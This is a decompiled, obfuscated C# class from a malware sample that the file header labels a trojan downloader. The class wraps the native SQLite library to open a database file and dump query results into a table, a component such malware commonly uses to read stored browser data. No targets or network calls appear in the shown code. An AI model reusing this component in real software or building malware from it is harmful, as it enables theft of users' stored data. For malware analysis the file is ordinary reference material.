// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Client, Version=1.0.0.0, Culture=neutral, PublicKeyToken=f0f23b7759753841
// MVID: 88398440-486F-46D0-BB45-521B8EE8871E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\Trojan-Downloader.MSIL.Agent.dpv-1fc722c8c40a50aaf248839f7da26ad37a11b67963cf37e94fefd262632ab6b2.exe

using \u000F\u0015;
using \u0011\u0015;
using \u0086\u0015;
using System;
using System.Data;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0086\u0015
{
  internal sealed class \u0084\u0015
  {
    [NonSerialized]
    internal static \u000E\u0015 \u0001;
    private IntPtr \u0001;

    [DllImport("kernel32", EntryPoint = "HeapAlloc")]
    private static extern IntPtr \u0083\u0017([In] IntPtr obj0, [In] uint obj1, [In] uint obj2);

    [DllImport("kernel32", EntryPoint = "GetProcessHeap")]
    private static extern IntPtr \u0084\u0017();

    [DllImport("kernel32", EntryPoint = "lstrlen")]
    private static extern int \u0086\u0017([In] IntPtr obj0);

    [DllImport("sqlite3", EntryPoint = "sqlite3_open")]
    private static extern int \u0087\u0017([In] IntPtr obj0, [In] ref IntPtr obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_prepare_v2")]
    private static extern int \u008B\u0017(
      [In] IntPtr obj0,
      [In] IntPtr obj1,
      [In] int obj2,
      [In] ref IntPtr obj3,
      [In] ref IntPtr obj4);

    [DllImport("sqlite3", EntryPoint = "sqlite3_step")]
    private static extern int \u008C\u0017([In] IntPtr obj0);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_count")]
    private static extern int \u008D\u0017([In] IntPtr obj0);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_name")]
    private static extern IntPtr \u008E\u0017([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_type")]
    private static extern int \u008F\u0017([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_int")]
    private static extern int \u0090\u0017([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_double")]
    private static extern double \u0091\u0017([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_text")]
    private static extern IntPtr \u0092\u0017([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_column_blob")]
    private static extern IntPtr \u0093\u0017([In] IntPtr obj0, [In] int obj1);

    [DllImport("sqlite3", EntryPoint = "sqlite3_finalize")]
    private static extern int \u0095\u0017([In] IntPtr obj0);

    public \u0084\u0015() => this.\u0001 = IntPtr.Zero;

    public \u0084\u0015([In] string obj0) => this.\u0096\u0017(obj0);

    public void \u0096\u0017([In] string obj0)
    {
      if (\u0084\u0015.\u0087\u0017(this.\u009D\u0017(obj0), ref this.\u0001) != 0)
      {
        this.\u0001 = IntPtr.Zero;
        throw new Exception(\u0099\u0005.\u0019\u0003(\u0084\u0015.\u0001(1611), obj0, \u0084\u0015.\u0001(1652)));
      }
    }

    public DataTable \u009A\u0017([In] string obj0)
    {
      IntPtr num1;
      IntPtr num2;
      \u0084\u0015.\u008B\u0017(this.\u0001, this.\u009D\u0017(obj0), this.\u009F\u0017(this.\u009D\u0017(obj0)), ref num1, ref num2);
      DataTable dataTable = new DataTable();
      int num3 = this.\u009B\u0017(num1, ref dataTable);
      while (num3 == 100)
        num3 = this.\u009C\u0017(num1, ref dataTable);
      \u0084\u0015.\u0095\u0017(num1);
      return dataTable;
    }

    private int \u009B\u0017([In] IntPtr obj0, [In] ref DataTable obj1)
    {
      obj1 = new DataTable(\u0084\u0015.\u0001(1657));
      if (\u0084\u0015.\u008C\u0017(obj0) == 100)
      {
        int num1 = \u0084\u0015.\u008D\u0017(obj0);
        string str1 = \u0084\u0015.\u0001(1023);
        object[] objArray = new object[checked (num1 - 1 + 1)];
        int num2 = checked (num1 - 1);
        int index = 0;
        while (index <= num2)
        {
          string str2 = this.\u009E\u0017(\u0084\u0015.\u008E\u0017(obj0, index));
          switch (\u0084\u0015.\u008F\u0017(obj0, index))
          {
            case 1:
              DataColumn dataColumn1 = \u0093\u0003.\u007E\u0094\u000E((object) \u0001\u0006.\u007E\u009A\u000E((object) obj1), str2, \u0012\u0004.\u0086\u0004(\u0084\u0015.\u0001(1674)));
              objArray[index] = (object) \u0084\u0015.\u0090\u0017(obj0, index);
              break;
            case 2:
              DataColumn dataColumn2 = \u0093\u0003.\u007E\u0094\u000E((object) \u0001\u0006.\u007E\u009A\u000E((object) obj1), str2, \u0012\u0004.\u0086\u0004(\u0084\u0015.\u0001(1691)));
              objArray[index] = (object) \u0084\u0015.\u0091\u0017(obj0, index);
              break;
            case 3:
              DataColumn dataColumn3 = \u0093\u0003.\u007E\u0094\u000E((object) \u0001\u0006.\u007E\u009A\u000E((object) obj1), str2, \u0012\u0004.\u0086\u0004(\u0084\u0015.\u0001(1712)));
              objArray[index] = (object) this.\u009E\u0017(\u0084\u0015.\u0092\u0017(obj0, index));
              break;
            case 4:
              DataColumn dataColumn4 = \u0093\u0003.\u007E\u0094\u000E((object) \u0001\u0006.\u007E\u009A\u000E((object) obj1), str2, \u0012\u0004.\u0086\u0004(\u0084\u0015.\u0001(1712)));
              objArray[index] = (object) this.\u009E\u0017(\u0084\u0015.\u0093\u0017(obj0, index));
              break;
            default:
              DataColumn dataColumn5 = \u0093\u0003.\u007E\u0094\u000E((object) \u0001\u0006.\u007E\u009A\u000E((object) obj1), str2, \u0012\u0004.\u0086\u0004(\u0084\u0015.\u0001(1712)));
              objArray[index] = (object) \u0084\u0015.\u0001(1023);
              break;
          }
          checked { ++index; }
        }
        DataRow dataRow = \u009B\u0005.\u007E\u0096\u000E((object) \u0019\u0006.\u007E\u009B\u000E((object) obj1), objArray);
      }
      return \u0084\u0015.\u008C\u0017(obj0);
    }

    private int \u009C\u0017([In] IntPtr obj0, [In] ref DataTable obj1)
    {
      int num1 = \u0084\u0015.\u008D\u0017(obj0);
      object[] objArray = new object[checked (num1 - 1 + 1)];
      int num2 = checked (num1 - 1);
      int index = 0;
      while (index <= num2)
      {
        switch (\u0084\u0015.\u008F\u0017(obj0, index))
        {
          case 1:
            objArray[index] = (object) \u0084\u0015.\u0090\u0017(obj0, index);
            break;
          case 2:
            objArray[index] = (object) \u0084\u0015.\u0091\u0017(obj0, index);
            break;
          case 3:
            objArray[index] = (object) this.\u009E\u0017(\u0084\u0015.\u0092\u0017(obj0, index));
            break;
          case 4:
            objArray[index] = (object) this.\u009E\u0017(\u0084\u0015.\u0093\u0017(obj0, index));
            break;
          default:
            objArray[index] = (object) \u0084\u0015.\u0001(1023);
            break;
        }
        checked { ++index; }
      }
      DataRow dataRow = \u009B\u0005.\u007E\u0096\u000E((object) \u0019\u0006.\u007E\u009B\u000E((object) obj1), objArray);
      return \u0084\u0015.\u008C\u0017(obj0);
    }

    private IntPtr \u009D\u0017([In] string obj0)
    {
      switch (obj0)
      {
        case null:
          return IntPtr.Zero;
        default:
          Encoding encoding = \u0005\u0005.\u0089\u0005();
          byte[] numArray = \u001D\u0005.\u007E\u0082\u0005((object) encoding, obj0);
          uint num1 = checked ((uint) (numArray.Length + 1));
          IntPtr num2 = \u0084\u0015.\u0083\u0017(\u0084\u0015.\u0084\u0017(), 0U, num1);
          \u0087\u0004.\u009D\u0005(numArray, 0, num2, numArray.Length);
          \u0008\u0006.\u009F\u0005(num2, numArray.Length, (byte) 0);
          return num2;
      }
    }

    private string \u009E\u0017([In] IntPtr obj0)
    {
      if (\u009C\u0004.\u001A\u0004(obj0, IntPtr.Zero))
        return (string) null;
      Encoding encoding = \u0005\u0005.\u0089\u0005();
      int num = this.\u009F\u0017(obj0);
      byte[] numArray = new byte[checked (num - 1 + 1)];
      \u0010\u0004.\u009E\u0005(obj0, numArray, 0, num);
      return \u0016\u0003.\u007E\u0086\u0005((object) encoding, numArray, 0, num);
    }

    private int \u009F\u0017([In] IntPtr obj0) => \u009C\u0004.\u001A\u0004(obj0, IntPtr.Zero) ? 0 : \u0084\u0015.\u0086\u0017(obj0);

    static \u0084\u0015() => \u0012\u0015.\u0006\u0017(typeof (\u0084\u0015));
  }
}
